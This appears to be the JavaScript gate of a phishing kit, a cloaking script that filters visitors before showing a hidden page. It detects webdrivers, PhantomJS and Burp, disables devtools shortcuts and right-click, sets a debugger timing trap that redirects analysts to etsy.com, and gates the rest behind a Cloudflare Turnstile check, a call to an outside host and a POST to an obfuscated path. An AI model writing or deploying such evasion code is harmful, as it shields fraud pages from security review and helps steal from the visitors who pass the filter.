var nr = window.location.hash.substr(1);
if (nr) {
window.location.replace('https://www.etsy.com');
}
if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.includes("Burp")) {
        window.location = "about:blank";
}
document.addEventListener("keydown", function (event) {
    function BzkvibsNzX(event) {
        const hhudPlJLjj = [
            { keyCode: 123 },
            { ctrl: true, keyCode: 85 },
            { ctrl: true, shift: true, keyCode: 73 },
            { ctrl: true, shift: true, keyCode: 67 },
            { ctrl: true, shift: true, keyCode: 74 },
            { ctrl: true, shift: true, keyCode: 75 },
            { ctrl: true, keyCode: 72 }, // Ctrl + H
            { meta: true, alt: true, keyCode: 73 },
            { meta: true, alt: true, keyCode: 67 },
            { meta: true, keyCode: 85 }
        ];

        return hhudPlJLjj.some(dLqTOtpPNQ =>
            (!dLqTOtpPNQ.ctrl || event.ctrlKey) &&
            (!dLqTOtpPNQ.shift || event.shiftKey) &&
            (!dLqTOtpPNQ.meta || event.metaKey) &&
            (!dLqTOtpPNQ.alt || event.altKey) &&
            event.keyCode === dLqTOtpPNQ.keyCode
        );
    }

    if (BzkvibsNzX(event)) {
        event.preventDefault();
        return false;
    }
});
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    return false;
});
QQMfWthWQA = false;
(function jeuXKaEXNQ() {
    let gbTtqDdbwC = false;
    const lkXwfkosJg = 100;
    setInterval(function() {
        const qOytIoDZnm = performance.now();
        debugger;
        const neJrRozQUF = performance.now();
        if (neJrRozQUF - qOytIoDZnm > lkXwfkosJg && !gbTtqDdbwC) {
            QQMfWthWQA = true;
            gbTtqDdbwC = true;
            window.location.replace('https://www.etsy.com');
        }
    }, 100);
})();

function eUvvdozcGz(){
window.location.replace('https://www.etsy.com');
var p = document.currentScript;
p.parentNode.removeChild(p);
}
window.onloadTurnstileCallback = function () {
  turnstile.render('#v', {
    sitekey: '0x4AAAAAABHqRl8V7I9b27na',
    callback: s,
});
};
function s(resp) {
    let formData = new FormData();
    formData.append('bltpg', '8UBimu');
    formData.append('sid', 'icWFP6QcZChGOjHi0f9TqccVh6FsY2ZWwVva6pv9');
    formData.append('bltdip', 'Unknown');
    formData.append('bltdref', '');
    formData.append('bltdua', 'Unknown');
    formData.append('bltddata', '');
    formData.append("cf-turnstile-response", resp);
    var q = "../rijVm6dMQYDmCs5nrW6QrzQE892j0pkPLbL8PBUWE4ef";
    fetch('https://y2fv4c.xubyc.es/gando!uqapan9a', {
    method: "GET",
    }).then(response => {
    return response.text()
    }).then(text => {
    if(text == 0){
    fetch(q, {
        method: "POST",
        body: formData
    }).then(response => {
        return response.json();
    }).then(data => {
        if(data['status'] == 'success'){
        if(QQMfWthWQA == false){
        location.reload();
        }
        }
        if(data['status'] == 'error'){
        eUvvdozcGz();
        }
    });
    }
    if(text != 0){
    eUvvdozcGz();
    }
    })
    .catch(error => {
    eUvvdozcGz();
    });
}
